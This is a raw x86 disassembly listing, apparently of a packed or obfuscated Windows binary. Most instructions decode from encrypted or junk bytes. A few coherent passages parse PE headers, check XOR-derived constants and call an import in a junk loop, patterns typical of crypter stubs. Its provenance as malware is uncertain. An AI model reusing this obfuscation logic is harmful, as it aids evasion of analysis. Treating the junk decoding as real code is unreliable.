  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411389
  411324:	stos   BYTE PTR es:[edi],al
  411325:	fdiv   st,st(7)
  411327:	jb     0x41134c
  411329:	popf   
  41132a:	sub    bl,BYTE PTR [edx+0x4bd9cdd]
  411330:	pop    ss
  411331:	hlt    
  411332:	pusha  
  411333:	adc    al,0x2c
  411335:	jecxz  0x411391
  411337:	or     bl,ah
  411339:	sub    BYTE PTR ds:0x8aaf82aa,cl
  41133f:	mov    cl,BYTE PTR [bp+si-0x58]
  411343:	pop    ss
  411344:	loope  0x4112ff
  411346:	mov    dh,0x81
  411348:	inc    esi
  411349:	stos   BYTE PTR es:[edi],al
  41134a:	xor    DWORD PTR [edi+0xc],edi
  41134d:	jae    0x411304
  41134f:	adc    al,0x1e
  411351:	nop
  411352:	fdiv   st(6),st
  411354:	sbb    DWORD PTR [edx-0x362f501b],ebp
  41135a:	sbb    edx,ebp
  41135c:	xchg   ecx,eax
  41135d:	jp     0x4112fe
  41135f:	sub    eax,0xcb4ca6a2
  411364:	jnp    0x4113c3
  411366:	jns    0x4113d0
  411368:	lock gs int 0xbd
  41136c:	imul   ecx,DWORD PTR [ebx+0x72],0xffffffc2
  411370:	stc    
  411371:	add    BYTE PTR [edi],cl
  411373:	scas   eax,DWORD PTR es:[edi]
  411374:	ja     0x4113ae
  411376:	sub    BYTE PTR [esi+eiz*2-0x1b9b2044],bl
  41137d:	scas   al,BYTE PTR es:[edi]
  41137e:	xchg   esp,eax
  41137f:	ds xor ah,0xbf
  411383:	mov    esi,DWORD PTR [ebp+0x71cb1b76]
  411389:	xor    al,0x6b
  41138b:	icebp  
  41138c:	addr16 cwde 
  41138e:	pop    ecx
  41138f:	jmp    0x411319
  411391:	daa    
  411392:	in     eax,dx
  411393:	shr    dh,1
  411395:	lea    esi,[esi]
  411397:	push   cs
  411398:	pop    edi
  411399:	mov    dh,cl
  41139b:	cmc    
  41139c:	pop    ds
  41139d:	js     0x4113c3
  41139f:	cli    
  4113a0:	das    
  4113a1:	in     eax,dx
  4113a2:	sbb    BYTE PTR [ebx-0x22f62dcf],dl
  4113a8:	and    edx,DWORD PTR [si+0x57c0]
  4113ad:	sbb    eax,0x419e9fac
  4113b2:	stos   BYTE PTR es:[edi],al
  4113b3:	pop    ecx
  4113b4:	test   BYTE PTR [eax+0x7f],bh
  4113b7:	jle    0x4113df
  4113b9:	push   ebx
  4113ba:	dec    ebp
  4113bb:	jno    0x4113b3
  4113bd:	popf   
  4113be:	add    dl,0x5f
  4113c1:	push   edi
  4113c2:	cmp    eax,0xa34ba4ee
  4113c7:	test   eax,0xca8d114
  4113cc:	push   0xfe79d62e
  4113d1:	inc    DWORD PTR [edx]
  4113d3:	adc    ebx,esp
  4113d5:	(bad)  
  4113d6:	sahf   
  4113d7:	inc    ecx
  4113d8:	lock pop esi
  4113da:	or     ebx,DWORD PTR ds:0x99d893fc
  4113e0:	inc    edi
  4113e1:	jp     0x411408
  4113e3:	push   ebx
  4113e4:	inc    edi
  4113e5:	es ins DWORD PTR es:[edi],dx
  4113e7:	push   ebp
  4113e8:	mov    dl,0x13
  4113ea:	xor    BYTE PTR [ebx],ch
  4113ec:	inc    esp
  4113ed:	pop    ds
  4113ee:	jbe    0x411433
  4113f0:	ins    BYTE PTR es:[edi],dx
  4113f1:	stos   DWORD PTR es:[edi],eax
  4113f2:	sub    edi,DWORD PTR [ecx]
  4113f4:	mov    esp,0x40b72eef
  4113f9:	(bad)  
  4113fa:	fst    QWORD PTR [edi-0x3b]
  4113fd:	aaa    
  4113fe:	(bad)  
  4113ff:	pop    ss
  411400:	scas   eax,DWORD PTR es:[edi]
  411401:	mov    eax,esi
  411403:	pop    es
  411404:	push   ds
  411405:	sub    cl,BYTE PTR [ebx-0x76152fca]
  41140b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41140c:	xchg   edi,eax
  41140d:	jecxz  0x411405
  41140f:	cmp    eax,esi
  411411:	aas    
  411412:	dec    esp
  411413:	(bad)  
  411414:	or     dl,dh
  411416:	mov    esp,0xca74e96c
  41141b:	sub    si,si
  41141e:	js     0x2628a163
  411424:	call   FWORD PTR [ecx-0x28a4d44a]
  41142a:	push   eax
  41142b:	mov    ds:0x6d351670,eax
  411430:	pop    edi
  411431:	ja     0x4113db
  411433:	dec    ecx
  411434:	cli    
  411435:	xchg   dl,ch
  411437:	cmp    DWORD PTR [eax-0x2044ae7a],esp
  41143d:	mov    ch,ah
  41143f:	sar    BYTE PTR [edi+eax*8],0x91
  411443:	mov    ecx,0x42eb4d5a
  411448:	xchg   edi,eax
  411449:	in     eax,0x88
  41144b:	fadd   st,st(1)
  41144d:	loop   0x4114b5
  41144f:	sbb    al,0x8d
  411451:	mov    dh,0x19
  411453:	dec    edi
  411454:	nop
  411455:	js     0x41145a
  411457:	popa   
  411458:	ds scas eax,DWORD PTR es:[edi]
  41145a:	jae    0x411450
  41145c:	pop    ss
  41145d:	not    DWORD PTR [esi+0x4cd990dc]
  411463:	jns    0x411455
  411465:	clc    
  411466:	mul    DWORD PTR [ecx]
  411468:	push   ecx
  411469:	sbb    DWORD PTR [eax+0x64],ecx
  41146c:	or     DWORD PTR [ebp-0xf],esi
  41146f:	outs   dx,BYTE PTR ds:[esi]
  411470:	shr    DWORD PTR [edi+0x38],0x7
  411474:	nop
  411475:	lods   eax,DWORD PTR ds:[esi]
  411476:	pop    es
  411477:	push   fs
  411479:	pop    esi
  41147a:	xchg   ebp,eax
  41147b:	mov    ds,WORD PTR [ebp+0x6]
  41147e:	lea    ebx,[edi+0x36]
  411481:	rol    BYTE PTR [bp-0x68],1
  411485:	mov    esi,0xa7277b23
  41148a:	(bad)  
  41148b:	fisttp QWORD PTR [eax]
  41148d:	jg     0x4114da
  41148f:	mov    edi,?
  411491:	ins    BYTE PTR es:[edi],dx
  411492:	daa    
  411493:	adc    BYTE PTR [edi+0x1d],al
  411496:	mov    ebp,0x8ae2816d
  41149b:	imul   DWORD PTR [edi+0x68b021b0]
  4114a1:	sub    edx,DWORD PTR [esi+ebp*4-0x2]
  4114a5:	mov    dl,0xdc
  4114a7:	add    bh,BYTE PTR [ebp+0x36283782]
  4114ad:	push   0x25
  4114af:	rol    BYTE PTR [ebp+0x45],0x7a
  4114b3:	dec    esi
  4114b4:	jecxz  0x411493
  4114b6:	jmp    0x411524
  4114b8:	ja     0x411517
  4114ba:	(bad)  
  4114bb:	push   ebx
  4114bc:	xchg   ebp,eax
  4114bd:	ins    BYTE PTR es:[edi],dx
  4114be:	cld    
  4114bf:	add    eax,0x291c10be
  4114c4:	mov    esi,0x3e766a69
  4114c9:	xor    eax,0x85ca7908
  4114ce:	dec    esi
  4114cf:	aad    0x46
  4114d1:	sar    BYTE PTR [edx],1
  4114d3:	hlt    
  4114d4:	adc    al,0x7
  4114d6:	jnp    0x41147c
  4114d8:	enter  0x7964,0xf4
  4114dc:	cli    
  4114dd:	sub    al,0xf9
  4114df:	mov    eax,0x24776cf9
  4114e4:	fstp   QWORD PTR [edx+edi*8+0x71]
  4114e8:	adc    ebp,DWORD PTR [esi]
  4114ea:	in     al,dx
  4114eb:	adc    eax,0x90c19590
  4114f0:	mov    esp,0xc8868ac3
  4114f5:	push   ss
  4114f6:	sti    
  4114f7:	and    eax,0x6c75f6b1
  4114fc:	pop    edi
  4114fd:	mov    esi,0x8f9bace0
  411502:	(bad)  
  411503:	cld    
  411504:	adc    edi,DWORD PTR [ebx+0x6d6afb2e]
  41150a:	mov    dl,0x2f
  41150c:	nop
  41150d:	sub    al,BYTE PTR [eax]
  41150f:	jo     0x411571
  411511:	into   
  411512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411513:	xchg   eax,esi
  411515:	mov    cl,0x1c
  411517:	xchg   edx,eax
  411518:	sub    esp,DWORD PTR [edi-0x20]
  41151b:	jno    0x411591
  41151d:	dec    edi
  41151e:	push   ebx
  41151f:	stc    
  411520:	sbb    al,0x65
  411522:	cmp    ebp,DWORD PTR [edx+0x1e]
  411525:	add    eax,DWORD PTR [ecx]
  411527:	ds pop ebp
  411529:	ss je  0x411536
  41152c:	cmp    DWORD PTR [ecx+edi*1],ebp
  41152f:	fild   QWORD PTR [edx]
  411531:	jns    0x411579
  411533:	std    
  411534:	rep stos DWORD PTR es:[edi],eax
  411536:	fdiv   st(0),st
  411538:	fisttp QWORD PTR [edi+0x27bf1fb1]
  41153e:	loope  0x4115b0
  411540:	push   ecx
  411541:	adc    ch,ah
  411543:	jb     0x4115b9
  411545:	aam    0xda
  411547:	jne    0x4115c7
  411549:	sbb    ebp,DWORD PTR [esi]
  41154b:	dec    eax
  41154c:	and    esi,DWORD PTR [esi]
  41154e:	adc    DWORD PTR [eax],0x16
  411551:	xchg   esi,eax
  411552:	fsub   QWORD PTR [edx+0x47191bed]
  411558:	sub    bl,bh
  41155a:	push   0x9b27218e
  41155f:	cmp    bh,BYTE PTR [edx+0x3cd0abb9]
  411565:	or     bh,ah
  411567:	andps  xmm2,xmm5
  41156a:	stos   BYTE PTR es:[edi],al
  41156b:	cmp    edi,DWORD PTR [esi]
  41156d:	or     esp,edx
  41156f:	ror    DWORD PTR [ebx],1
  411571:	xchg   ebx,eax
  411572:	push   cs
  411573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411574:	bound  edi,QWORD PTR [esi+0x6bd7ac95]
  41157a:	add    BYTE PTR [esi+0x57],0x69
  41157e:	enter  0x4673,0x6d
  411582:	rol    esi,0xb3
  411585:	outs   dx,DWORD PTR ds:[esi]
  411586:	push   ebx
  411587:	xchg   ecx,eax
  411588:	pop    ecx
  411589:	(bad)  
  41158a:	cmp    BYTE PTR [ebx-0x175fb0e9],bh
  411590:	pushf  
  411591:	jbe    0x411585
  411593:	pop    ds
  411594:	adc    DWORD PTR [esi],ecx
  411596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411597:	in     al,dx
  411598:	mov    al,ds:0xf63c1b4d
  41159d:	jecxz  0x4115ba
  41159f:	lods   al,BYTE PTR ds:[esi]
  4115a0:	outs   dx,BYTE PTR ds:[esi]
  4115a1:	xchg   esi,eax
  4115a2:	push   ss
  4115a3:	mov    esi,DWORD PTR [ebx+eiz*2]
  4115a6:	lea    edi,[ebx]
  4115a8:	pop    edx
  4115a9:	cmp    ebp,edi
  4115ab:	cmp    eax,0x62948f5e
  4115b0:	push   0x7a87e040
  4115b5:	in     al,0xc3
  4115b7:	ret    
  4115b8:	push   0xa2267060
  4115bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115be:	not    BYTE PTR [esi-0x2a5da56]
  4115c4:	mov    esp,0xb3c40cff
  4115c9:	daa    
  4115ca:	jnp    0x411566
  4115cc:	fisttp WORD PTR [edi-0x58f2922e]
  4115d2:	sbb    ah,BYTE PTR [esi-0x75]
  4115d5:	push   ebp
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	add    al,0x24
  41161a:	cmp    al,0x9b
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x4115ce
  411625:	xchg   DWORD PTR [edi+0x1e706fa],edi
  41162b:	mov    ebx,DWORD PTR [esi-0xba47d03]
  411631:	loop   0x411628
  411633:	and    DWORD PTR ds:0x6b794263,ebx
  411639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41163a:	out    0x87,eax
  41163c:	fwait
  41163d:	adc    eax,0xe324a8f8
  411642:	dec    edx
  411643:	pop    ebp
  411644:	scas   eax,DWORD PTR es:[edi]
  411645:	mov    ebp,0x23bbe0c0
  41164a:	imul   ebp,DWORD PTR [ebp+0x4b],0xb2847b8d
  411651:	sub    eax,0x5e8132ec
  411656:	cmp    bh,ah
  411658:	retf   0x5f52
  41165b:	mov    eax,ds:0xbea53ae0
  411660:	push   ebx
  411661:	sub    eax,0x51428073
  411666:	cmp    ebx,esp
  411668:	add    ebx,DWORD PTR [edi]
  41166a:	loop   0x4115ef
  41166c:	pusha  
  41166d:	fsubr  DWORD PTR [eax-0x8]
  411670:	push   edi
  411671:	push   esp
  411672:	in     al,0x1f
  411674:	popa   
  411675:	adc    edi,ecx
  411677:	adc    DWORD PTR [esi+0x54],esi
  41167a:	sub    edx,DWORD PTR [edi]
  41167c:	adc    al,0x8
  41167e:	cmp    eax,0x3220cc29
  411683:	mov    ecx,esp
  411685:	mov    cs,WORD PTR [ebx-0x2d]
  411688:	mov    ebp,0xb0340207
  41168d:	int3   
  41168e:	fimul  DWORD PTR [edi+0x17e9f14c]
  411694:	pop    ds
  411695:	div    DWORD PTR [eax-0x16]
  411698:	call   0x633d:0x665837fc
  41169f:	pop    eax
  4116a0:	shl    DWORD PTR [eax+0x63e1f611],0x85
  4116a7:	sub    ah,BYTE PTR [edi-0x31]
  4116aa:	cdq    
  4116ab:	adc    ecx,DWORD PTR [ebp-0x7858b404]
  4116b1:	aas    
  4116b2:	in     eax,0x83
  4116b4:	popa   
  4116b5:	push   ss
  4116b6:	iret   
  4116b7:	sub    al,0x4d
  4116b9:	loope  0x411660
  4116bb:	pop    es
  4116bc:	les    ebx,FWORD PTR [edi]
  4116be:	sbb    DWORD PTR [eax+0x11],esi
  4116c1:	in     al,dx
  4116c2:	std    
  4116c3:	xchg   BYTE PTR [esi],dh
  4116c5:	mov    bh,dh
  4116c7:	jnp    0x411662
  4116c9:	jnp    0x41165a
  4116cb:	mov    cs,WORD PTR [esi+0x3]
  4116ce:	pusha  
  4116cf:	inc    ebx
  4116d0:	lahf   
  4116d1:	sar    DWORD PTR [ebx+0x5a],cl
  4116d4:	xchg   esi,eax
  4116d5:	in     eax,0x16
  4116d7:	and    ebp,edi
  4116d9:	inc    eax
  4116da:	(bad)  
  4116db:	in     al,dx
  4116dc:	scas   eax,DWORD PTR es:[edi]
  4116dd:	inc    eax
  4116de:	test   al,0xa1
  4116e0:	jnp    0x411748
  4116e2:	nop
  4116e3:	lock cmp DWORD PTR ds:0x18a64c82,eax
  4116ea:	cld    
  4116eb:	mov    dl,BYTE PTR [edi+0x47]
  4116ee:	lods   al,BYTE PTR ds:[esi]
  4116ef:	adc    BYTE PTR [edx-0x5],bl
  4116f2:	pop    ecx
  4116f3:	adc    cl,BYTE PTR [eax+0x60d46ca]
  4116f9:	aam    0xa3
  4116fb:	fcmovbe st,st(7)
  4116fd:	(bad)  
  4116fe:	jbe    0x4116d7
  411700:	ins    DWORD PTR es:[edi],dx
  411701:	cmp    edx,DWORD PTR [edi]
  411703:	and    ah,dh
  411705:	and    BYTE PTR [esi+0x7b],0x9b
  411709:	retf   0x443a
  41170c:	ins    DWORD PTR es:[edi],dx
  41170d:	sub    al,0xdf
  41170f:	loopne 0x4116a1
  411711:	mov    ch,0x39
  411713:	icebp  
  411714:	pop    ebp
  411715:	push   edx
  411716:	(bad)  
  411717:	fisttp DWORD PTR [ebx]
  411719:	adc    al,0xe
  41171b:	outs   dx,DWORD PTR ds:[esi]
  41171c:	sbb    DWORD PTR [edi],esp
  41171e:	adc    eax,0xd852b8bd
  411723:	mov    edx,edx
  411725:	lods   eax,DWORD PTR fs:[esi]
  411727:	mov    ds,ebp
  411729:	dec    DWORD PTR ds:0x9b09ab37
  41172f:	sub    DWORD PTR [eax+0x6b1c143a],esp
  411735:	pop    es
  411736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411737:	mov    edx,0xe78a95ef
  41173c:	hlt    
  41173d:	mov    ebx,0xc47b7105
  411742:	xchg   dl,bh
  411744:	dec    ecx
  411745:	jbe    0x4117b7
  411747:	jecxz  0x4117b5
  411749:	sub    ebx,0x52
  41174c:	out    dx,eax
  41174d:	lods   eax,DWORD PTR ds:[esi]
  41174e:	mov    ch,dh
  411750:	pop    es
  411751:	push   edi
  411752:	ret    0x70b6
  411755:	xor    DWORD PTR [eax+0xb6fe8],esp
  41175b:	jmp    0xf9b7f8a3
  411760:	sub    al,0xd6
  411762:	leave  
  411763:	dec    edx
  411764:	subps  xmm5,XMMWORD PTR [ecx+0x6b38f7f2]
  41176b:	push   edi
  41176c:	js     0x411752
  41176e:	and    eax,0xfcd736d0
  411773:	pop    esp
  411774:	push   es
  411775:	xchg   edi,eax
  411776:	jmp    0x411778
  411778:	rcl    ah,0x39
  41177b:	sub    eax,0xbe26e9b5
  411780:	out    dx,al
  411781:	(bad)  
  411782:	mov    eax,0xbfdf133
  411787:	inc    eax
  411788:	pushf  
  411789:	push   0xfa12f86a
  41178e:	adc    DWORD PTR [ebx-0x1a],0x5a11c5e0
  411795:	outs   dx,DWORD PTR ds:[esi]
  411796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411797:	pushf  
  411798:	ins    BYTE PTR es:[edi],dx
  411799:	xor    ebx,ecx
  41179b:	daa    
  41179c:	mov    al,0x69
  41179e:	dec    ebx
  41179f:	mov    dh,0xc6
  4117a1:	xor    bh,BYTE PTR [ebp-0x71ad5ca]
  4117a7:	js     0x411775
  4117a9:	(bad)  
  4117aa:	adc    eax,0x49adeedf
  4117af:	inc    esi
  4117b0:	rcr    DWORD PTR ss:[edx+0x39],0xee
  4117b5:	imul   esp,DWORD PTR [edx-0x2c],0x73
  4117b9:	enter  0xa5ce,0x1d
  4117bd:	mov    ebx,0xd033fe6e
  4117c2:	test   BYTE PTR es:[ecx-0x5c8d4cb5],bh
  4117c9:	stc    
  4117ca:	mov    es,WORD PTR [edi+0x458b0a2f]
  4117d0:	or     bh,al
  4117d2:	add    eax,0x433823
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x43377f2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43381f,0x433783
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43381f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43379b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43382b,0x0
  41182f:	mov    eax,ds:0x43382b
  411834:	inc    eax
  411835:	mov    ds:0x43382b,eax
  41183a:	cmp    DWORD PTR ds:0x43382b,0xb
  411841:	jne    0x411887
  411847:	push   0x43393c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43382b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43382b
  411899:	inc    eax
  41189a:	mov    ds:0x43382b,eax
  41189f:	cmp    DWORD PTR ds:0x43382b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	fldln2 
  4118e9:	inc    ecx
  4118ea:	out    dx,eax
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x4118bb
  4118f4:	(bad)  
  4118f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f6:	and    al,0x88
  4118f8:	ins    DWORD PTR es:[edi],dx
  4118f9:	lods   al,BYTE PTR ds:[esi]
  4118fa:	pop    ecx
  4118fb:	gs out dx,al
  4118fd:	cmp    al,0xdd
  4118ff:	mov    eax,0x8baa7fae
  411904:	xchg   ecx,eax
  411905:	inc    edx
  411906:	dec    edx
  411907:	mov    ds:0xb949d6c5,eax
  41190c:	(bad)
  411910:	in     al,0x51
  411912:	push   0xcf80db97
  411917:	jp     0x4118c6
  411919:	(bad)  
  41191a:	(bad)  
  41191b:	cmp    BYTE PTR [ebx-0x18b6fa3e],cl
  411921:	bswap  edx
  411923:	mov    edi,0x269dd452
  411928:	inc    si
  41192a:	inc    ecx
  41192b:	fstp   TBYTE PTR [ebp-0x39]
  41192e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41192f:	out    dx,al
  411930:	jmp    0xaa371256
  411935:	lods   eax,DWORD PTR ds:[esi]
  411936:	sub    edi,DWORD PTR [ebx-0x702356be]
  41193c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193d:	outs   dx,BYTE PTR ds:[esi]
  41193e:	rcl    esi,0x3f
  411941:	cmp    edx,DWORD PTR ds:0x3e737ca0
  411947:	aaa    
  411948:	imul   eax,DWORD PTR [edx+ebx*8+0x31],0xffffff82
  41194d:	cmp    ebx,DWORD PTR [edi-0x72f69627]
  411953:	call   0x23b5431e
  411958:	jg     0x41194d
  41195a:	adc    edx,DWORD PTR [ebx]
  41195c:	shr    BYTE PTR [ebx],cl
  41195e:	mov    ebp,0x5eafd90c
  411963:	jnp    0x411973
  411965:	lock in eax,0xe5
  411968:	fbstp  TBYTE PTR [edx+0x3fdd4aa]
  41196e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41196f:	add    DWORD PTR [edi-0x15],esp
  411972:	dec    edx
  411973:	or     dl,0x2f
  411976:	jle    0x41194e
  411978:	pop    esi
  411979:	clc    
  41197a:	shl    DWORD PTR [esi+0x33],cl
  41197d:	cmp    BYTE PTR [edx-0x61],ch
  411980:	fwait
  411981:	cwde   
  411982:	fidivr WORD PTR [ebp+0x3aca4806]
  411988:	xchg   ebx,eax
  411989:	push   ebx
  41198a:	push   ecx
  41198b:	mov    bh,0xca
  41198d:	scas   eax,DWORD PTR es:[edi]
  41198e:	add    dh,dh
  411990:	mov    esi,0xc7a2dca9
  411995:	lods   eax,DWORD PTR ds:[esi]
  411996:	xchg   ebx,eax
  411997:	push   edx
  411998:	ja     0x41199a
  41199a:	or     eax,0xc03f6dfe
  41199f:	mov    cl,0x7a
  4119a1:	mov    ah,0x95
  4119a3:	jge    0x411962
  4119a5:	aaa    
  4119a6:	xchg   esp,eax
  4119a7:	push   ss
  4119a8:	pxor   mm4,mm3
  4119ab:	fcom   DWORD PTR [edi]
  4119ad:	sbb    BYTE PTR [eax],0xf3
  4119b0:	lock mov WORD PTR [ebx+0x20491d74],?
  4119b7:	or     DWORD PTR [ebx],0xffffff9f
  4119ba:	ds test eax,0x895f297
  4119c0:	in     eax,0x80
  4119c2:	(bad)  
  4119c3:	in     eax,dx
  4119c4:	add    ecx,edx
  4119c6:	and    BYTE PTR [ecx-0x433dd12d],bl
  4119cc:	out    dx,eax
  4119cd:	push   esp
  4119ce:	xchg   ebp,eax
  4119cf:	and    BYTE PTR [ebp+0x1f],ch
  4119d2:	addr16 mov eax,ds:0xa3c0
  4119d6:	mov    esp,0x4f1be884
  4119db:	mov    cl,0x54
  4119dd:	hlt    
  4119de:	mov    eax,ds:0xc2127c8b
  4119e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e4:	cmp    BYTE PTR [ecx-0x39],ch
  4119e7:	cmc    
  4119e8:	jmp    DWORD PTR [ecx+0x5ece0d4b]
  4119ee:	xchg   esp,eax
  4119ef:	imul   ebx,DWORD PTR [esi+eax*2-0x15],0xfffffff9
  4119f4:	adc    eax,0xd98417b7
  4119f9:	inc    edi
  4119fa:	xchg   ecx,eax
  4119fb:	jecxz  0x411a01
  4119fd:	and    DWORD PTR [edx-0x5f9a8863],esp
  411a03:	add    bl,cl
  411a05:	or     DWORD PTR [ebx],ebx
  411a07:	(bad)  ds:0x80a5131f
  411a0d:	je     0x4119f3
  411a0f:	std    
  411a10:	pop    edi
  411a11:	pop    ebx
  411a12:	sbb    BYTE PTR [esi-0x35],0xa4
  411a16:	js     0x411a83
  411a18:	adc    eax,0xd4889a07
  411a1d:	pop    ebx
  411a1e:	mov    eax,0x84a6595f
  411a23:	sbb    ah,bl
  411a25:	push   0xa3d4a247
  411a2a:	pop    edx
  411a2b:	bound  ecx,QWORD PTR [edi-0x52]
  411a2e:	ret    0xa453
  411a31:	jno    0x4119d8
  411a33:	xchg   ecx,eax
  411a34:	stos   DWORD PTR es:[edi],eax
  411a35:	inc    esp
  411a36:	icebp  
  411a37:	not    edx
  411a39:	das    
  411a3a:	cmp    bl,BYTE PTR [ecx+eax*4+0x70]
  411a3e:	ss das 
  411a40:	ret    0xc395
  411a43:	xor    dh,BYTE PTR [esp+ebx*1]
  411a46:	daa    
  411a47:	inc    edx
  411a48:	inc    esp
  411a49:	xor    eax,0x5b3720c1
  411a4e:	cwde   
  411a4f:	cmp    BYTE PTR fs:[esi-0x9],bh
  411a53:	mov    edx,DWORD PTR [esi+0x30f0773e]
  411a59:	lahf   
  411a5a:	pop    edx
  411a5b:	fldenv [edi-0x71]
  411a5e:	in     eax,dx
  411a5f:	adc    DWORD PTR [eax-0xda82a7a],ecx
  411a65:	in     al,0x61
  411a67:	lahf   
  411a68:	jge    0x411a73
  411a6a:	(bad)  
  411a6b:	sbb    eax,0x9caa24fc
  411a70:	pop    ebx
  411a71:	fcomp  DWORD PTR [ecx-0xb2a1b60]
  411a77:	xchg   edi,eax
  411a78:	sbb    DWORD PTR [esp+eiz*8],eax
  411a7b:	jp     0x411ac3
  411a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a7e:	xchg   BYTE PTR [edi+0x3f2cea0f],dh
  411a84:	adc    al,0xfb
  411a86:	fimul  DWORD PTR [ecx+0x35854dd9]
  411a8c:	js     0x411a55
  411a8e:	cmc    
  411a8f:	push   0x2
  411a91:	cmc    
  411a92:	jae    0x411a6c
  411a94:	ficom  WORD PTR [edi+0x43a6de13]
  411a9a:	cmp    al,0x6a
  411a9c:	dec    edi
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
